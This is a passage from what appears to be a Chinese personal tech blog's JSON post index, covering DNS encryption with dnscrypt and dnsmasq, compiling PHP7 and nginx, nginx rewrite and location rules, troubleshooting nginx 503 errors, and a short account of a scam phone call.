$client-&gt;read(&apos;/remote/server/image.png&apos;, $saveLocal);其他方法以上只是列举了一些简单的使用方法，更具体的参考https://github.com/upyun/php-sdk/blob/master/doc.md 包括文件的上传、删除、创建目录、删除目录、刷新、异步云处理、异步查询等等功能的使用。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://awen.me/tags/PHP/"}]},{"title":"搜狗输入法的最佳打开方式","slug":"搜狗输入法的最佳打开方式","date":"2017-08-31T09:45:15.000Z","updated":"2021-02-26T06:05:29.340Z","comments":true,"path":"posts/50336.html","link":"","permalink":"https://awen.me/posts/50336.html","excerpt":"其实吧，我一开始不稀罕搜狗输入法的，不过因为工作原因，用其他的方式，比如 mac 自带的或者鼠须管有个功能似乎都没搜狗用起来爽，那就是搜狗的自定义词组，这个功能对于我这样经常要给客户发重复性的文件，要大大节省了重复输入相同文字的时间成本，相比较于 mac 自带的文本替换，搜狗用起来确实是要爽点。","text":"其实吧，我一开始不稀罕搜狗输入法的，不过因为工作原因，用其他的方式，比如 mac 自带的或者鼠须管有个功能似乎都没搜狗用起来爽，那就是搜狗的自定义词组，这个功能对于我这样经常要给客户发重复性的文件，要大大节省了重复输入相同文字的时间成本，相比较于 mac 自带的文本替换，搜狗用起来确实是要爽点。 比如，我输入以下内容 您好,很高兴为您服务，请问有什么可以帮到您的,在处理问题之前,麻烦您先提供下您的账号或服务名，然后直接回复您的问题就可以啦（故障类的问题需要提交具体的节点 IP 和报错截图）我会尽快为您处理哦！ 每服务一个客户都发一次我打字得把手打废掉，另外还有可能输入错，但是用了搜狗的自定义词组，这个事情就变得比较方便了，比如我定义一个 jr 后面的内容就是上面的，让他出现在第一位。这个每次我输入 jr 直接空格就输入完了。 另外就是写文档，中英文之间空格这个功能搜狗也有提供，还是很方便的。","categories":[],"tags":[{"name":"搜狗","slug":"搜狗","permalink":"https://awen.me/tags/%E6%90%9C%E7%8B%97/"}]},{"title":"加密DNS","slug":"加密DNS查询","date":"2017-08-28T05:48:13.000Z","updated":"2021-02-26T06:05:29.318Z","comments":true,"path":"posts/41548.html","link":"","permalink":"https://awen.me/posts/41548.html","excerpt":"在这片神奇的土地上，上个网并不是件容易的事情，因为会遇到以下问题 DNS 污染，比如您请求某些站点，返回给你的IP是被污染的 IP 而非站点的真实 IP DNS 劫持，比如请求谷歌，返回给你的却不是谷歌的 IP 这个问题是谁做的，我们不需要知道，或者知道了但是也不能奈何他，面对强权，我们个人的力量实在是太渺小了。当然还有其他的，比如钓鱼网站啊，垃圾弹窗啊，各种广告啊这种都会影响到我们的访问。","text":"在这片神奇的土地上，上个网并不是件容易的事情，因为会遇到以下问题 DNS 污染，比如您请求某些站点，返回给你的IP是被污染的 IP 而非站点的真实 IP DNS 劫持，比如请求谷歌，返回给你的却不是谷歌的 IP 这个问题是谁做的，我们不需要知道，或者知道了但是也不能奈何他，面对强权，我们个人的力量实在是太渺小了。当然还有其他的，比如钓鱼网站啊，垃圾弹窗啊，各种广告啊这种都会影响到我们的访问。 但是，我们有拒绝这种行为的方法。在正式讲解之前，我们先看下传统的DNS是怎么去获取网站的IP 地址的 早上互联网初期，网站是很少的，那个时候基本上把IP对应的域名写到 HOSTS文件就可以搞定了 但是，随着联网设备越来越多，这种做法显得很不合理，因此就有了 DNS。 什么是 DNSDNS 是目前互联网的一项服基础服务，他用来将域名和 IP地址相互映射的一个分布式数据库，可以把他想象成一个巨大的电话本，对应这手机号和姓名；他使用的是TCP和UDP的53端口，但是基本上都是使用UDP 因为TCP要建立三次握手，查询会非常慢，不过随着最近几年的DNS 污染 劫持越来越严重，很多DNS都利用其他端口了比如OPENDNS使用5353或其他端口。 DNS是怎么工作的呢？我们看下下图 我们使用dig这个命令来看下可以给我们列出来a-m这么些个根服务器 ➜ www dig ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 55650 ;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;. IN NS ;; ANSWER SECTION: . 518400 IN NS a.root-servers.net. . 518400 IN NS b.root-servers.net. . 518400 IN NS c.root-servers.net. . 518400 IN NS d.root-servers.net. . 518400 IN NS e.root-servers.net. . 518400 IN NS f.root-servers.net. . 518400 IN NS g.root-servers.net. . 518400 IN NS h.root-servers.net. . 518400 IN NS i.root-servers.net. . 518400 IN NS j.root-servers.net. . 518400 IN NS k.root-servers.net. . 518400 IN NS l.root-servers.net. . 518400 IN NS m.root-servers.net. ;; Query time: 126 msec ;; SERVER: 127.0.0.54#53(127.0.0.54) ;; WHEN: Mon Aug 28 14:03:05 2017 ;; MSG SIZE rcvd: 239比如我们要查询 awen.me 从本地解析到 IP 地址这个过程都是怎么样查到的，我们可以通过 dig awen.me +trace 去查看，先找到根服务器，然后找到根下面的.me服务器 然后找到 dnspod 的 ns 服务器然后找到绑定的 A 记录地址。 ➜ ~ dig awen.me +trace ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; awen.me +trace ;; global options: +cmd . 82701 IN NS e.root-servers.net. . 82701 IN NS a.root-servers.net. . 82701 IN NS d.root-servers.net. . 82701 IN NS k.root-servers.net. . 82701 IN NS i.root-servers.net. . 82701 IN NS j.root-servers.net. . 82701 IN NS b.root-servers.net. . 82701 IN NS m.root-servers.net. . 82701 IN NS f.root-servers.net. . 82701 IN NS h.root-servers.net. . 82701 IN NS g.root-servers.net. . 82701 IN NS l.root-servers.net. . 82701 IN NS c.root-servers.net. ;; Received 239 bytes from 127.0.0.1#53(127.0.0.1) in 5800 ms me. 172800 IN NS b0.nic.me. me. 172800 IN NS a0.nic.me. me. 172800 IN NS c0.nic.me. me. 172800 IN NS b2.nic.me. me. 172800 IN NS a2.nic.me. ;; Received 334 bytes from 192.33.4.12#53(192.33.4.12) in 2155 ms awen.me. 86400 IN NS f1g1ns1.dnspod.net. awen.me. 86400 IN NS f1g1ns2.dnspod.net. ;; Received 79 bytes from 199.249.119.1#53(199.249.119.1) in 588 ms awen.me. 600 IN A 35.194.252.98 awen.me. 86400 IN NS f1g1ns1.dnspod.net. awen.me. 86400 IN NS f1g1ns2.dnspod.net. ;; Received 105 bytes from 101.226.220.16#53(101.226.220.16) in 8 ms关于DNS的原理，更具体的可以参考这篇文章http://www.ruanyifeng.com/blog/2016/06/dns.html DNS 为什么会被劫持因为 DNS 是明文传输的，当你访问一个网站，查询到的 IP 地址，有些人或黑客都是可以看到的。因此他可以在传输中就把你的内容给替换了。所以返回给你的不一定就是正确的 IP 了。 加密查询我们可以通过 dnscrypt 来加密查询内容https://dnscrypt.org/。 以mac为例，下载后安装完毕（需要重启一次），然后启动，勾选开启和关闭ipv6选项 当出现一个加锁的图标，就表示开启成功了 然后我们 dig 一个域名看看结果会发现查询的DNS是127.0.0.54的53端口 自己搭建本地的dns服务器加密查询brew cask reinstall dnscrypt brew install dnscrypt-proxy brew install dnsmasq配置 dnsmasq1.拷贝配置文件 sudo cp /usr/local/etc/dnsmasq.conf.default /usr/local/etc/dnsmasq.conf配置参考https://awen.me/post/9868.html 然后在 /usr/local/etc/ 创建一个文件 resolv.dnsmasq.conf ➜ etc git:(master) ✗ cat resolv.dnsmasq.conf nameserver 119.29.29.29 nameserver 8.8.8.8 nameserver 8.8.4.4 nameserver 42.120.21.30 nameserver 168.95.1.1 nameserver 115.231.100.1062.解析都在dnsmasq.d目录下 ## 配置 dnscrypt-proxy 配置文件在 /usr/local/etc/dnscrypt-proxy.conf ,修改 LocalAddress 的值，注意不要为53以外的其他端口，因为53端口要给 dnsmasq 用 LocalAddress 127.0.0.1:40然后测试 dig awen.me -p 40 @127.0.0.1 ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; awen.me -p 40 @127.0.0.1 ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 51383 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1252 ;; QUESTION SECTION: ;awen.me. IN A ;; ANSWER SECTION: awen.me. 15 IN A 35.194.252.98 ;; Query time: 719 msec ;; SERVER: 127.0.0.1#40(127.0.0.1) ;; WHEN: Tue Aug 29 19:59:31 2017 ;; MSG SIZE rcvd: 52抓包分析下，可以看到本地和服务器的 443 端口通信 然后我们修改dnsmasq的配置，添加 server=127.0.0.1#40 cat dnsmasq.conf| grep ^server server=127.0.0.1#40 最后，修改本机 DNS 为 127.0.0.1 ，搞定。 国内域名不加密git clone https://github.com/felixonmars/dnsmasq-china-list.git 将里面的配置文件全部复制到dnsmasq.d去 重启 sudo brew services restart dnsmasq sudo brew services restart dnscrypt-proxy","categories":[],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://awen.me/tags/DNS/"}]},{"title":"骗子(二)","slug":"骗子-二","date":"2017-08-28T03:36:25.000Z","updated":"2021-02-26T06:05:29.360Z","comments":true,"path":"posts/11176.html","link":"","permalink":"https://awen.me/posts/11176.html","excerpt":"上午11点25分左右，一个新加坡的电话打过来。然后我就接了，那边传来的是一段录音“您的电话出现异常，将在2小时后停机，如需帮助请按9人工服务” 哈哈。这明显是电信诈骗电话嘛！","text":"上午11点25分左右，一个新加坡的电话打过来。然后我就接了，那边传来的是一段录音“您的电话出现异常，将在2小时后停机，如需帮助请按9人工服务” 哈哈。这明显是电信诈骗电话嘛！ 不过我想看看这个骗子到底是怎么实施诈骗的。于是我按了9 一个操着福建或广东？口音的男子接了电话，然后我就问。我没有做什么呀，怎么会异常。男子说您肯定是最近做了什么操着导致的手机异常了。我这边帮您查询下原因，麻烦您报给我一下您的姓名，我就报了个假名给他，方云，然后还要确认我的身份证号码,我稀里哗啦的报了一串我自己都没记住的身份证号给他，然后他和我核对半天挂了电话了。。。。 所以，我在想这种骗术咋还能活着？明眼人一看就看出来了嘛！","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"使用dnsmasq搭建dns服务器","slug":"使用dnsmasq-搭建dns服务器","date":"2017-08-28T02:22:07.000Z","updated":"2021-02-26T06:05:29.308Z","comments":true,"path":"posts/9868.html","link":"","permalink":"https://awen.me/posts/9868.html","excerpt":"DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能。自己搭建公共DNS更加灵活，如果是在本地搭建，还可以大幅提高解析速度。 相比较BIND那复杂的配置来说，dnsmasq绝对轻量多了。","text":"DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能。自己搭建公共DNS更加灵活，如果是在本地搭建，还可以大幅提高解析速度。 相比较BIND那复杂的配置来说，dnsmasq绝对轻量多了。 安装yum -y install dnsmasq配置1.配置文件在 /etc/dnsmasq.conf，我们要让他能用起来需要做如下配置 #指定上游dns服务器 resolv-file=/etc/resolv.dnsmasq.conf #表示严格按照 resolv-file 文件中的顺序从上到下进行 DNS 解析, 直到第一个成功解析成功为止 strict-order # 开启后会寻找本地的hosts文件在去寻找缓存的域名，最后到上游dns查找 #no-resolv listen-address=0.0.0.0 #0.0.0.0 设置为公网IP conf-dir=/etc/dnsmasq.d # 我们的解析记录都写到这个目录下 2.创建 /etc/resolv.dnsmasq.conf ，然后添加 # cat /etc/resolv.dnsmasq.conf nameserver 119.29.29.29 nameserver 114.114.114.114 nameserver 8.8.8.8 nameserver 168.95.1.13.然后创建 /etc/dnsmasq.d/cloud.conf。添加 address=/baidu.com/127.0.0.1 #将百度的域名解析到127.0.0.1 address=/ad.youku.com/127.0.0.1 # 禁止优酷广告 address=/ad.iqiyi.com/127.0.0.1 # 禁止iqiyi广告格式是 address=/domain.com/dns比如上面的百度，我就把他都解析到127.0.0.1 实现DNS分流 server=/cn/114.114.114.114 # cn的域名都走114的dns server=/google.com/115.159.220.214 # 将谷歌的解析都走115.159.220.214上面的是将所有cn结尾的域名都走114解析，下面是将google.com 走115.159.220.214解析 开启防火墙53端口由于我是阿里云，内部的iptables 我已经关闭了 需要去安全组设置udp 53端口入方向放行 然后本地测试下是否是通的 ➜ www nc -vuz 121.42.18.6 53 found 0 associations found 1 connections: 1: flags=82&lt;CONNECTED,PREFERRED&gt; outif (null) src 192.168.2.32 port 49939 dst 121.42.18.6 port 53 rank info not available Connection to 121.42.18.6 port 53 [udp/domain] succeeded!然后启动 service dnsmasq start设置为开机自启动 # systemctl enable dnsmasq Created symlink from /etc/systemd/system/multi-user.target.wants/dnsmasq.service to /usr/lib/systemd/system/dnsmasq.service.测试➜ www dig m.baidu.com @121.42.18.6 ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; m.baidu.com @121.42.18.6 ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41523 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;m.baidu.com. IN A ;; ANSWER SECTION: m.baidu.com. 0 IN A 127.0.0.1 ;; Query time: 30 msec ;; SERVER: 121.42.18.6#53(121.42.18.6) ;; WHEN: Mon Aug 28 10:32:27 2017 ;; MSG SIZE rcvd: 45哈哈，百度的子域名已经被解析到127.0.0.1了。 此外还可以配合dnscrypt-proxy 对查询进行加密","categories":[],"tags":[{"name":"DNS","slug":"DNS","permalink":"https://awen.me/tags/DNS/"}]},{"title":"为什么有的MP4文件在chrome浏览器无法播放","slug":"为什么有的MP4文件在chrome浏览器无法播放","date":"2017-08-27T02:31:23.000Z","updated":"2021-02-26T06:05:29.297Z","comments":true,"path":"posts/54811.html","link":"","permalink":"https://awen.me/posts/54811.html","excerpt":"一同事反馈说客户的视频是MP4格式，并且在VLC和ffplay都可以播放，但是chrome无法播放，这是为什么 这个是因为Chrome浏览器虽然支持HTML5，但是它只支持原生播放部分的MP4格式（不用通过Flash等插件）。 为什么是部分MP4呢？MP4有非常复杂的含义（见http://en.wikipedia.org/wiki/Mp4）,普通人对MP4的理解是后缀为.mp4的文件。但MP4本身不是一种简单的视频格式，它是一个包装了视频和音频格式的壳。至于里面的视频和音频使用什么编码格式是可变的。MP4的视频格式可以使用DivX也可使用H264，Chrome只支持H264。","text":"一同事反馈说客户的视频是MP4格式，并且在VLC和ffplay都可以播放，但是chrome无法播放，这是为什么 这个是因为Chrome浏览器虽然支持HTML5，但是它只支持原生播放部分的MP4格式（不用通过Flash等插件）。 为什么是部分MP4呢？MP4有非常复杂的含义（见http://en.wikipedia.org/wiki/Mp4）,普通人对MP4的理解是后缀为.mp4的文件。但MP4本身不是一种简单的视频格式，它是一个包装了视频和音频格式的壳。至于里面的视频和音频使用什么编码格式是可变的。MP4的视频格式可以使用DivX也可使用H264，Chrome只支持H264。 为什么Chrome不支持所有的视频编码格式？绝大部份的视频编码格式都是要付版权费的，Google已经为H264买了单，Firefox没有Google那么有钱不愿意买。 我们看下这个视频的格式是什么，video：mpeg4，因此chrome无法识别该格式 所以chrome打开是这样的 那如果是H264格式的则是类似这样的输出","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://awen.me/tags/chrome/"}]},{"title":"编译安装PHP7","slug":"编译安装PHP7","date":"2017-08-26T08:22:08.000Z","updated":"2021-02-26T06:05:29.352Z","comments":true,"path":"posts/63255.html","link":"","permalink":"https://awen.me/posts/63255.html","excerpt":"安装库yum install libxml2-devel gd-devel libmcrypt-devel libcurl-devel openssl-devel下载","text":"安装库yum install libxml2-devel gd-devel libmcrypt-devel libcurl-devel openssl-devel下载 wget -c http://be2.php.net/distributions/php-7.1.8.tar.gz编译1.解压进入目录 # cd php-7.1.8 2.编译配置 #./configure --prefix=/usr/local/php7 \\ --with-config-file-path=/usr/local/php7/etc \\ --with-config-file-scan-dir=/usr/local/php7/etc/php.d \\ --with-mcrypt=/usr/include \\ --enable-mysqlnd \\ --with-mysqli \\ --with-pdo-mysql \\ --enable-fpm \\ --with-fpm-user=www \\ --with-fpm-group=www \\ --with-gd \\ --with-iconv \\ --with-zlib \\ --enable-xml \\ --enable-shmop \\ --enable-sysvsem \\ --enable-inline-optimization \\ --enable-mbregex \\ --enable-mbstring \\ --enable-ftp \\ --enable-gd-native-ttf \\ --with-openssl \\ --enable-pcntl \\ --enable-sockets \\ --with-xmlrpc \\ --enable-zip \\ --enable-soap \\ --without-pear \\ --with-gettext \\ --enable-session \\ --with-curl \\ --with-jpeg-dir \\ --with-freetype-dir \\ --enable-opcache出现如图所示 则表示配置没问题 然后执行 make &amp;&amp; make install然后配置 php-fpm.d # cd /usr/local/php7/etc # mv php-fpm.conf.default php-fpm.conf # mv php-fpm.d/www.conf.defualt php-fpm.d/www.conf # mv php-fpm.d/www.conf.default php-fpm.d/www.conf然后进入 php 的源码目录 # cd php-7.1.8/sapi/fpm/ # cp init.d.php-fpm /etc/init.d/php-fpm # chmod +x /etc/init.d/php-fpm # chkconfig --add php-fpm # # chkconfig php-fpm on然后启动 [root@aliyun fpm]# /etc/init.d/php-fpm restart Gracefully shutting down php-fpm warning, no pid file found - php-fpm is not running ? Starting php-fpm [26-Aug-2017 16:52:34] ERROR: [pool www] cannot get uid for user &apos;nginx&apos; [26-Aug-2017 16:52:34] ERROR: FPM initialization failed failed报错了？这要进入 # cd /usr/local/php7/etc/php-fpm.d/ # vim www.conf将用户和组修改为何 nginx 一样的组合用户吧，这里我设置的是 www user = www group = www或者编译的时候指定用户和组 --with-fpm-user=nginx \\ --with-fpm-group=nginx \\用 nginx 做代理编译 nginx 的配置文件 vim /usr/local/nginx/conf/nginx.conf去掉默认的注释 location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params; }修改为 location ~ \\.php$ { #root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /$document_root$fastcgi_script_name; include fastcgi_params; } 然后定义下首页内容加上 php root html; index index.php index.html index.htm; 重启 nginx /etc/init.d/nginx restart在 web 站点的目录下新建一个 phpinfo.php 文件 [root@aliyun html]# pwd /usr/local/nginx/html [root@aliyun html]# vim phpinfo.php [root@aliyun html]# cat phpinfo.php &lt;?php phpinfo();访问效果 问题1.找不到 php.ini 进入源码目录 cp php.ini-production /usr/local/php7/etc/php.ini然后执行 # /usr/local/php7/bin/php --ini Configuration File (php.ini) Path: /usr/local/php7/etc Loaded Configuration File: /usr/local/php7/etc/php.ini Scan for additional .ini files in: /usr/local/php7/etc/php.d Additional .ini files parsed: (none)2.关闭响应头中的 php 版本 编辑 php.ini 找到如下参数设置为 off expose_php = Off3.通过 nginx请求 php 文件提示nginx File not found 错误，原因是php-fpm进程找不到SCRIPT_FILENAME配置的要执行的.php文件，php-fpm返回给nginx的默认404错误提示。 解决方案：确定是我上面那样配置的，不要打错了。","categories":[],"tags":[]},{"title":"nginx rewrite","slug":"nginx-rewrite","date":"2017-08-26T01:42:38.000Z","updated":"2021-02-26T06:05:29.280Z","comments":true,"path":"posts/8147.html","link":"","permalink":"https://awen.me/posts/8147.html","excerpt":"nginx通过ngx_http_rewrite_module模块支持url重写、支持if条件判断，但不支持else。 该模块需要PCRE支持，应在编译nginx时指定PCRE源码目录","text":"nginx通过ngx_http_rewrite_module模块支持url重写、支持if条件判断，但不支持else。 该模块需要PCRE支持，应在编译nginx时指定PCRE源码目录 nginx rewrite指令执行顺序：1.执行server块的rewrite指令(这里的块指的是server关键字后{}包围的区域，其它xx块类似)2.执行location匹配3.执行选定的location中的rewrite指令如果其中某步URI被重写，则重新循环执行1-3，直到找到真实存在的文件 如果循环超过10次，则返回500 Internal Server Error错误 break指令语法：break;默认值：无作用域：server,location,if 停止执行当前虚拟主机的后续rewrite指令集break指令实例： if ($slow) { limit_rate 10k; break; }if指令语法：if(condition){…}默认值：无作用域：server,location对给定的条件condition进行判断。如果为真，大括号内的rewrite指令将被执行。if条件(conditon)可以是如下任何内容: 一个变量名；false如果这个变量是空字符串或者以0开始的字符串； 使用= ,!= 比较的一个变量和字符串 是用~， ~*与正则表达式匹配的变量，如果这个正则表达式中包含}，;则整个表达式需要用” 或’ 包围 使用-f ，!-f 检查一个文件是否存在 使用-d, !-d 检查一个目录是否存在 使用-e ，!-e 检查一个文件、目录、符号链接是否存在 使用-x ， !-x 检查一个文件是否可执行 if指令实例 if ($http_user_agent ~ MSIE) { rewrite ^(.*)$ /msie/$1 break; } if ($http_cookie ~* &quot;id=([^;]+)(?:;|$)&quot;) { set $id $1; } if ($request_method = POST) { return 405; } if ($slow) { limit_rate 10k; } if ($invalid_referer) { return 403; }return指令 语法：return code; return code URL; return URL; 默认值：无 作用域：server,location,if 停止处理并返回指定状态码(code)给客户端。 非标准状态码444表示关闭连接且不给客户端发响应头。 从0.8.42版本起，return 支持响应URL重定向(对于301，302，303，307），或者文本响应(对于其他状态码). 对于文本或者URL重定向可以包含变量rewrite指令 语法：rewrite regex replacement [flag]; 默认值：无 作用域：server,location,if 如果一个URI匹配指定的正则表达式regex，URI就按照replacement重写。 rewrite按配置文件中出现的顺序执行。flags标志可以停止继续处理。 如果replacement以&quot;http://&quot;或&quot;https://&quot;开始，将不再继续处理，这个重定向将返回给客户端。 flag可以是如下参数 last 停止处理后续rewrite指令集，然后对当前重写的新URI在rewrite指令集上重新查找。 break 停止处理后续rewrite指令集，并不在重新查找,但是当前location内剩余非rewrite语句和location外的的非rewrite语句可以执行。 redirect 如果replacement不是以http:// 或https://开始，返回302临时重定向 permant 返回301永久重定向 最终完整的重定向URL包括请求scheme(http://,https://等),请求的server_name_in_redirect和 port_in_redirec三部分 ，说白了也就是http协议 域名 端口三部分组成。rewrite实例 server { ... rewrite ^(/download/.*)/media/(.*)..*$ $1/mp3/$2.mp3 last; rewrite ^(/download/.*)/audio/(.*)..*$ $1/mp3/$2.ra last; return 403; ... }如果这些rewrite放到 “/download/” location如下所示, 那么应使用break而不是last , 使用last将循环10次匹配，然后返回 500错误: location /download/ { rewrite ^(/download/.*)/media/(.*)..*$ $1/mp3/$2.mp3 break; rewrite ^(/download/.*)/audio/(.*)..*$ $1/mp3/$2.ra break; return 403; }对于重写后的URL（replacement）包含原请求的请求参数，原URL的?后的内容。如果不想带原请求的参数 ，可以在replacement后加一个问号。如下，我们加了一个自定义的参数user=$1,然后在结尾处放了一个问号?,把原请的参数去掉。 rewrite ^/users/(.*)$ /show?user=$1? last;如果正则表达regex式中包含 “}” 或 “;”, 那么整个表达式需要用双引号或单引号包围. rewrite_log指令 语法：rewrite_log on|off; 默认值：rewrite_log off; 作用域：http,server,location,if 开启或关闭以notice级别打印rewrite处理日志到error log文件。 nginx打开rewrite log例子 rewrite_log on; error_log logs/xxx.error.log notice; 1.打开rewrite on 2.把error log的级别调整到 noticeset指令 语法：set variable value; 默认值：none 作用域：server,location,if 定义一个变量并赋值，值可以是文本，变量或者文本变量混合体。 uninitialized_variable_warn指令 语法：uninitialized_variable_warn on | off; 默认值：uninitialized_variable_warn on 作用域：http,server,location,if 控制是否输出为初始化的变量到日志 本文转自http://www.nginx.cn/216.html","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://awen.me/tags/nginx/"}]},{"title":"NGINX location","slug":"NGINX-location","date":"2017-08-26T01:38:05.000Z","updated":"2021-02-26T06:05:29.260Z","comments":true,"path":"posts/31126.html","link":"","permalink":"https://awen.me/posts/31126.html","excerpt":"location匹配命令~ #波浪线表示执行一个正则匹配，区分大小写* #表示执行一个正则匹配，不区分大小写^ #^~表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录= #进行普通字符精确匹配@ #”@” 定义一个命名的 location，使用在内部定向时，例如 error_page, try_files","text":"location匹配命令~ #波浪线表示执行一个正则匹配，区分大小写* #表示执行一个正则匹配，不区分大小写^ #^~表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录= #进行普通字符精确匹配@ #”@” 定义一个命名的 location，使用在内部定向时，例如 error_page, try_files location 匹配的优先级(与location在配置文件中的顺序无关)= 精确匹配会第一个被处理。如果发现精确匹配，nginx停止搜索其他匹配。普通字符匹配，正则表达式规则和长的块规则将被优先和查询匹配，也就是说如果该项匹配还需去看有没有正则表达式匹配和更长的匹配。^~ 则只匹配该规则，nginx停止搜索其他匹配，否则nginx会继续处理其他location指令。最后匹配理带有”“和”*”的指令，如果找到相应的匹配，则nginx停止搜索其他匹配；当没有正则表达式或者没有正则表达式被匹配的情况下，那么匹配程度最高的逐字匹配指令会被使用。 例如 location = / { # 只匹配&quot;/&quot;. [ configuration A ] } location / { # 匹配任何请求，因为所有请求都是以&quot;/&quot;开始 # 但是更长字符匹配或者正则表达式匹配会优先匹配 [ configuration B ] } location ^~ /images/ { # 匹配任何以 /images/ 开始的请求，并停止匹配 其它location [ configuration C ] } location ~* .(gif|jpg|jpeg)$ { # 匹配以 gif, jpg, or jpeg结尾的请求. # 但是所有 /images/ 目录的请求将由 [Configuration C]处理. [ configuration D ] }本文来源http://www.nginx.cn/115.html","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://awen.me/tags/nginx/"}]},{"title":"nginx 访问503的处理思路","slug":"nginx-访问503的处理思路","date":"2017-08-26T01:13:57.000Z","updated":"2021-02-26T06:05:29.280Z","comments":true,"path":"posts/51870.html","link":"","permalink":"https://awen.me/posts/51870.html","excerpt":"前几天访问自己的博客，有些图片资源直接吐了503。于是展开了排查，最终还是解决了。下面说下解决思路 首先，要理解503错误的原因是什么?","text":"前几天访问自己的博客，有些图片资源直接吐了503。于是展开了排查，最终还是解决了。下面说下解决思路 首先，要理解503错误的原因是什么? HTTP 协议会通过一些状态码来表示服务端相应给客户端的状态，通过状态码能够大致确定故障问题的原因，比如 401 错误 通常来说就是认证出现了问题。那么 503 则是由于服务器负载过高导致无法处理请求而返回的状态。 知道了原因，我们就来进行排查，我们可以从以下几个方面排查： 1.服务器当前的负载是否过高，因为我的是一个小内存服务器，这种负载过高的问题时有发生，所以当时我就去看了下负载，发现很正常 [root@aliyun ~]# uptime 09:20:19 up 22:29, 2 users, load average: 0.00, 0.01, 0.052.然后检查内存，虽然小，但是也没用完。 3.检查 nginx 配置，嗯。在查配置的时候发现了这么一条 #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存， #以$binary_remote_addr 为key,限制平均每秒的请求为20个， #1M能存储16000个状态，rete的值必须为整数， #如果限制两秒钟一个请求，可以设置成30r/m limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s; ... server{ ... location { ... #限制每ip每秒不超过20个请求，漏桶数burst为5 #brust的意思就是，如果第1秒、2,3,4秒请求为19个， #第5秒的请求为25个是被允许的。 #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。 #nodelay，如果不设置该选项，严格使用平均速率限制请求数， #第1秒25个请求时，5个请求放到第2秒执行， #设置nodelay，25个请求将在第1秒执行。 limit_req zone=allips burst=5 nodelay; ... } ... } ...先注释掉，然后重启下，发现问题没有了。原因就是限制了每个 IP 的请求，导致服务器拒绝了。","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://awen.me/tags/nginx/"}]},{"title":"编译和升级 NGINX","slug":"web-基础知识之web-服务器","date":"2017-08-25T03:49:39.000Z","updated":"2021-02-26T06:05:29.293Z","comments":true,"path":"posts/26752.html","link":"","permalink":"https://awen.me/posts/26752.html","excerpt":"web 服务器是用来干什么的web 服务器是一种用来提供 网页展示的程序，是响应来自 Web 浏览器的请求发送出 Web 页的软件，比如微软的 IIS 、apache httpd 、nginx、tomcat 等都是 web 服务器。 那这么些年，最火的是 nginx。几乎大中型站点都开始拥抱 nginx。本文主要讲解如何从源码编译安装 nginx，这也将是我们后来学习 web 协议的第一课。","text":"web 服务器是用来干什么的web 服务器是一种用来提供 网页展示的程序，是响应来自 Web 浏览器的请求发送出 Web 页的软件，比如微软的 IIS 、apache httpd 、nginx、tomcat 等都是 web 服务器。 那这么些年，最火的是 nginx。几乎大中型站点都开始拥抱 nginx。本文主要讲解如何从源码编译安装 nginx，这也将是我们后来学习 web 协议的第一课。 安装依赖yum -y install gcc gcc-c++ pcre-devel openssl-devel zlib-devel 下载wget -c https://nginx.org/download/nginx-1.12.1.tar.gz wget -c https://www.openssl.org/source/openssl-1.0.2l.tar.gz wget -c ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.41.tar.gz wget -c http://zlib.net/zlib-1.2.11.tar.gz安装 zlibzlib 是一些和压缩相关的库。比如网页要进行压缩 配置 gzip 就需要用到 zlib 库 tar zxvf zlib-1.2.11.tar.gz cd zlib-1.2.11 ./configure make make install安装 pcrepcre 是一些和正则相关的库，比如 nginx 需要配置 rewrite 规则 tar zxvf pcre-8.41.tar.gz cd pcre-8.41 ./configure make &amp;&amp; make install安装 opensslopenssl 是一些和加密相关的库，比如需要配置证书 tar zxvf openssl-1.0.2l.tar.gz安装 nginx1.创建组和用户 groupadd www useradd -s /sbin/nologin -g www www2.解压编译 tar zxvf nginx-1.12.1.tar.gz cd nginx-1.12.1 ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/root/pcre-8.41 --with-http_ssl_module --with-zlib=/root/zlib-1.2.11 --with-openssl=/root/openssl-1.0.2l make &amp;&amp; make install3.查看安装路径下的程序 # 